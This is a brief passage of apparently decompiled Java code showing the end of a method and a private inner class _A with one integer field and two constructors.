        var2.consume(var6);
        var5.B = var6;
    }

    private class _A {
        private int B;

        private _A() {
        }

        _A(Object var2) {
            this();
        }
    }
}
